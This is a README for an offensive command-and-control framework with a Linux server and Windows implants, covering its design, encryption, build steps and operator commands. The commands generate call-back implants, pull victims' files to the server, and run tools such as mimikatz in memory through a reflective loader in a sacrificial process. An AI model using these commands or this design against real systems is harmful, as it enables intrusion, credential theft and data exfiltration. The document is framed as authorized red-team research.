# Dragon C2

A command and control framework written in C for offensive security research.

Server runs on Linux. Client runs on Windows. All traffic is encrypted with X25519 ECDH + ChaCha20-Poly1305.

> **Disclaimer:** This tool is for authorized security testing and educational purposes only. The author is not responsible for any misuse. Always get written permission before testing on systems you do not own.

## Features

- Multi-level client chaining (tested up to level 4 with mixed transports)
- Transport support: TCP, HTTP, HTTPS, SMB (still in test)
- HTTPS with TLS certificate pinning and ephemeral certificates
- X25519 ECDH key exchange + ChaCha20-Poly1305 encryption
- Double encryption layer for sub-clients (end-to-end, parent cannot read payload)
- Interactive shell (cmd.exe) [LEGACY - not supported in multi-protocol chain]
- File upload (server to client) and download (client to server) with chunking
- In-memory PE execution via reflective loader in a sacrificial process
- Client cross-compilation from the server console
- Beacon-based client health monitoring
- MongoDB for client persistence (not implemented yet)

## Architecture

```
                    +------------------+
                    |   Dragon Server  |
                    |   (Linux / C)    |
                    +--------+---------+
                             |
                     HTTPS / TCP / HTTP
                             |
                    +--------+---------+
                    |  Level 1 Client  |
                    |  (Windows / C)   |
                    +--------+---------+
                             |
                    HTTPS / TCP / SMB
                             |
                    +--------+---------+
                    |  Level 2 Client  |
                    |  (Windows / C)   |
                    +--------+---------+
                             |
                           (...)
```

Each client can act as a relay for deeper clients. The server communicates end-to-end with every client regardless of depth. Parent nodes only see encrypted blobs and forward them without being able to read the content.

## Crypto

- **Key exchange:** X25519 ECDH with ephemeral client keys and a static server key
- **Encryption:** ChaCha20-Poly1305 IETF (AEAD) for every frame
- **KDF:** BLAKE2B (via libsodium crypto_generichash) to derive encryption key, base IV, and chain key
- **Nonce:** base_iv XOR monotonic counter (unique per frame)
- **Sub-clients:** double encryption layer. Inner layer is end-to-end between server and sub-client. Outer layer is between parent and child for transport security. Parent cannot decrypt the inner payload.
- **TLS pinning:** HTTPS clients verify the server certificate SHA-256 hash at first connection

### Known crypto limitations (documented, not yet fixed)

- No server authentication (theoretical MitM on first connection)
- chain_key is derived but never used (no key rotation or forward secrecy)
- Server public key is static and hardcoded in the client

## Project structure

```
dragon_c2/
  server/
    dragon_server.c        Main server with operator console
    crypto_dragon.c/.h     Shared crypto functions
    transport.c/.h         Transport registry
    transport_tcp.c        TCP backend (Linux)
    transport_http.c       HTTP backend (Linux, OpenSSL)
    transport_https.c      HTTPS backend (Linux, OpenSSL)
    keygen.c               Key and certificate pin generator
    CMakeLists.txt         Server build
  client/
    client.c               Main client
    crypto_dragon.c/.h     Client-side crypto
    transport.c/.h         Transport registry
    transport_tcp.c        TCP backend (Windows, Winsock)
    transport_http.c       HTTP backend (Windows, WinHTTP)
    transport_https.c      HTTPS backend (Windows, WinHTTP + OpenSSL)
    transport_smb.c        SMB backend (Windows, named pipes)
    reflective_loader.c/.h Reflective PE loader (PIC shellcode)
    client_config.h.in     CMake config template
    CMakeLists.txt         Client cross-compile build
  cmake/
    mingw-w64-toolchain.cmake   Cross-compilation toolchain
  deps/
    mingw64/               MinGW libraries (libsodium, OpenSSL)
  output/                  Generated client binaries
  setup_deps.sh            Downloads and builds MinGW dependencies
  .gitignore
  README.md
  CONTRIBUTING.md
  LICENSE
```

## Requirements

### Server (Linux)

- GCC
- CMake 3.20+
- libsodium
- MongoDB C driver (libmongoc + libbson)
- GNU readline
- OpenSSL 3.x
- MongoDB server running on localhost:27017

### Client cross-compilation

- x86_64-w64-mingw32-gcc (MinGW-w64 cross-compiler)
- libsodium compiled for mingw64
- OpenSSL compiled for mingw64

## Setup

### 1. Install system packages

```bash
# Ubuntu / Debian
sudo apt update && sudo apt install -y \
    build-essential cmake ninja-build \
    libsodium-dev libmongoc-dev libreadline-dev libssl-dev \
    gcc-mingw-w64-x86-64 binutils-mingw-w64-x86-64 \
    xxd
```

### 2. Install MongoDB

```bash
# Ubuntu 22.04 / 24.04
# Follow the official MongoDB docs for your distro:
# https://www.mongodb.com/docs/manual/tutorial/install-mongodb-on-ubuntu/

# After install, start it:
sudo systemctl start mongod
sudo systemctl enable mongod
```

### 3. Build the server

```bash
cd dragon_c2
cmake -S server -B server/build
cmake --build server/build
```

This produces two binaries in `server/build/`:
- `server` - the Dragon C2 server
- `keygen` - key and certificate generator

### 4. Generate TLS certificate

Required for HTTPS transport. The server uses this certificate for TLS connections with clients.

```bash
openssl req -x509 -newkey rsa:4096 \
    -keyout server.key -out server.crt \
    -days 365 -nodes -subj "/CN=dragon"
```

### 5. Generate keys

This creates the X25519 keypair and computes the TLS certificate pin. Run it from the project root:

```bash
./server/build/keygen
```

Output files:
- `server_priv.bin` - server private key
- `server_pub.h` - server public key + certificate pin (embedded in client at compile time)

### 6. Install MinGW dependencies

Required for cross-compiling Windows clients from Linux:

```bash
chmod +x setup_deps.sh
./setup_deps.sh
```

This downloads libsodium for MinGW and compiles OpenSSL for MinGW. Takes about 5 minutes. The libraries are placed in `deps/mingw64/`.

### 7. Start the server

```bash
cd dragon_c2
./server/build/server
```

The server must be started from the project root directory so that it can find `server_priv.bin`, `server_pub.h`, `client/`, and `cmake/`.

## Usage

### Start a listener

```
Dragon: start https 8080
```

Supported protocols: `tcp`, `http`, `https`

### Generate a client

Level 1 client (connects directly to server):
```
Dragon: generate https 1 192.168.1.100 8080
```

Level 2 client (connects through a level 1 client):
```
Dragon: generate https 2 192.168.1.50 4447
```

With custom beacon interval (default is 20 seconds):
```
Dragon: generate https 1 192.168.1.100 8080 60
```

The generated .exe is in `output/`.

### List clients

```
Dragon: clients
```

Shows all connected clients with ID, level, transport, IP, last beacon time, and status.

### Run a command

```
Dragon: send 8080 1 <client_id> whoami
```

### Interactive shell

```
Dragon: shell 8080 1 <client_id>
```

Type commands normally. Type `exit` or press Ctrl+C to close the shell.

### Upload file (server to client)

```
Dragon: uploads 8080 1 <client_id> /tmp/payload.exe C:\Users\test\payload.exe
```

Paths with spaces use single quotes:
```
Dragon: uploads 8080 1 <client_id> '/tmp/my file.exe' 'C:\Users\test\my file.exe'
```

### Download file (client to server)

```
Dragon: downloads 8080 1 <client_id> C:\Users\test\secret.txt /tmp/secret.txt
```

### Execute PE in memory

Runs a PE in a sacrificial notepad.exe process using a reflective loader. Output is captured and sent back to the server.

```
Dragon: execmem 8080 1 <client_id> /tmp/mimikatz.exe
```

With arguments:
```
Dragon: execmem 8080 1 <client_id> /tmp/tool.exe --flag value
```

### Start a listener on a client (for chaining)

Tell a level 1 client to listen on port 4447 for a level 2 client:

```
Dragon: stlistener 8080 1 <client_id> 4447 https
```

### Stop a client listener

```
Dragon: stop_listener 8080 1 <client_id> 4447
```

### List client listeners

```
Dragon: listlisteners 8080 1 <client_id>
```

### List client routes

```
Dragon: listroutes 8080 1 <client_id>
```

### Stop a server listener

```
Dragon: stop 8080
```

### List server listeners

```
Dragon: list
```

### All commands

```
Dragon: help
```

## Multi-level chaining example

This example sets up a 3-level chain: Server -> Client A -> Client B -> Client C

```
# 1. Start HTTPS listener on the server
Dragon: start https 8080

# 2. Generate and deploy Client A (level 1)
Dragon: generate https 1 10.0.0.1 8080

# 3. After Client A connects, tell it to listen on port 4447
Dragon: stlistener 8080 1 <clientA_id> 4447 https

# 4. Generate Client B (level 2, connects to Client A)
Dragon: generate https 2 10.0.0.50 4447

# 5. After Client B connects, tell it to listen on port 5555
Dragon: stlistener 8080 2 <clientB_id> 5555 tcp
#   (use stlistener through Client A since Client B is behind it)

# 6. Generate Client C (level 3, connects to Client B)
Dragon: generate tcp 3 10.0.0.75 5555

# 7. Send a command to Client C (goes through A and B)
Dragon: send 8080 3 <clientC_id> ipconfig
```

All commands to Client C are encrypted end-to-end. Client A and Client B relay the packets but cannot read the payload.

## Beacon and health monitoring

The server checks client health every 30 seconds. If a client has not sent any data for 120 seconds, it is marked as dead.

- On TCP and SMB: the client sends a periodic beacon (opcode 0x01) every BEACON_INTERVAL seconds
- On HTTP and HTTPS: the client sends a periodic beacon via POST to ensure the server updates the heartbeat timestamp

The beacon interval is configurable per client at generation time (default: 20 seconds).

## Protocol

### Packet format

Every packet is a fixed 2048-byte `PACKET_DRAGON` struct, encrypted into a 2064-byte frame (2048 + 16 byte Poly1305 tag).

```
| opcode (6B) | payload_size (2B) | target_level (1B) | target_id (41B) | payload (1998B) |
```

### Opcodes

```
0x00  Init / ID exchange         0x0B  Start listener (on client)
0x01  Beacon                     0x0C  Stop listener (on client)
0x02  Command exec / output      0x0D  Register new sub-client (routing)
0x03  Shell start                0x0E  Request listener list
0x04  Disconnect                 0x0F  Request route list
0x05  Shell data                 0x10  Handshake pubkey relay
0x06  Shell end                  0x11  Handshake ACK
0x07  DLL inject [LEGACY]        0x12  Client ID assignment
0x14  File download request      0x13  Handshake confirm
0x15  File download chunk        0x17  File upload start
0x16  File download end          0x18  File upload chunk
0x1A  File upload ACK            0x19  File upload end
0x1B  Exec memory start          0x1C  Exec memory PE chunk
0x1D  Exec memory args
```

Download = client sends file to server. Upload = server sends file to client.

## Reflective loader

The client executes native PEs in memory without writing to disk:

1. Server sends the PE binary in chunks to the client
2. Client spawns a suspended notepad.exe as a sacrificial process
3. Client writes the raw PE into the sacrificial process memory
4. Client writes a position-independent reflective loader (shellcode) into the process
5. The loader maps PE sections, applies relocations, resolves imports, and calls the entry point
6. stdout is captured via a pipe and sent back to the server as command output
7. The sacrificial process is terminated when done

The reflective loader is compiled as PIC (position-independent code) with stack protector disabled, extracted as raw shellcode via objcopy, and embedded in the client as a byte array.

## Building the client manually

If you prefer to build the client without the server's `generate` command:

```bash
# Copy server_pub.h to client directory
cp server_pub.h client/

# Configure
cmake -S client -B output/build \
    -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-w64-toolchain.cmake \
    -DCLIENT_LEVEL=1 \
    -DSERVER_IP=192.168.1.100 \
    -DSERVER_PORT=8080 \
    -DUPSTREAM_TRANSPORT=https \
    -DBEACON_INTERVAL=20

# Build
cmake --build output/build
```

The output is `output/build/client.exe`. It is statically linked and has no external dependencies beyond standard Windows DLLs.

## TODO

- [ ] .NET assembly execution via CLR hosting (clr_runner.dll compiled, not yet integrated)
- [ ] Sleep/jitter configurable from server at runtime
- [ ] SOCKS5 proxy support
- [ ] DNS transport
- [ ] Transports for IoT devices
- [ ] Management socket for GUI
- [ ] Linux client
- [ ] Key rotation using chain_key (forward secrecy)
- [ ] Server authentication (prevent MitM on first connection)

## Author

Giovanni - Cybersecurity Professional

## Status

This project is in its early stages. The core features work but there is a lot of room for improvement. Check the TODO list and CONTRIBUTING.md if you want to help.
Bug reports, feature ideas, and pull requests are all welcome. Every contribution helps the project grow.
Thanks to everyone who takes the time to look at this project, test it, or contribute in any way.

## License

This project is licensed under the GNU General Public License v3.0. See [LICENSE](LICENSE) for details.